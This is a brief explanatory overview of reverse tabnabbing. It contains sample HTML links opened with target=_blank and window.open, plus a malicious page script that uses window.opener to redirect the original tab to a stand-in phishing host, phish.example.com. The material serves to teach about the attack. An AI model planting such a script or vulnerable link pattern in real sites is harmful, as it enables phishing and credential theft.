# ------------------------------- start reverse tabnabbing overview ------------------------------- # 
    ==> Quick view: Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, 
                    for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to 
                    notice that it has been changed to a phishing site, especially it the site looks the same as the target. If the user authenticates 
                    to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.

                    The attack is also possible for link opened via the window.open javascript function.

    ==> attack scenario:
            Vulnerable page:
                <html>
                    <body>
                        <li><a href="bad.example.com" target="_blank">Vulnerable target using html link to open the new page</a></li>
                        <button onclick="window.open('https://bad.example.com')">Vulnerable target using javascript to open the new page</button>
                    </body>
                </html>

            Malicious Site that is linked to:
                <html>
                    <body>
                        <script>
                            if (window.opener) {
                                window.opener.location = "https://phish.example.com";
                            }
                        </script>
                    </body>
                </html>

            When a user clicks on the Vulnerable Target link/button then the Malicious Site is opened in a new tab (as expected) but 
            the target site in the original tab is replaced by the phishing site.
